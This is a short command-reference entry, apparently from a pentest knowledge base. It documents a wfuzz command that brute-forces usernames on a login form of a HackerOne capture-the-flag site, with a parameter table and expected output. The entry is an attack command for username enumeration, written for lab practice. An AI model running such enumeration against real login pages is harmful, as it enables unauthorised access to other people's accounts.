---
id: cmd-uuid-7
data: >-
  wfuzz -z file,wordlists/usernames.txt --hs 'Invalid Username' -d
  'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login
tags:
  - bruteforce
type: command
output: Found access.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:55.451Z'
verified: false
validated: true
submitted: true
---
# Wfuzz Brute Username

## Command

```bash
wfuzz -z file,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login
```

## Description

Brute-forces usernames by hiding invalid responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --hs | Hide string | No |
| -d | POST data | Yes |

## Examples

### Basic Usage

```bash
wfuzz -z file,users.txt --hs invalid https://login
```

## Expected Output

Valid username hits.

## Related

- [[procedures/Brute-Force-Credentials-and-Manipulate-Base64-Cookie]]
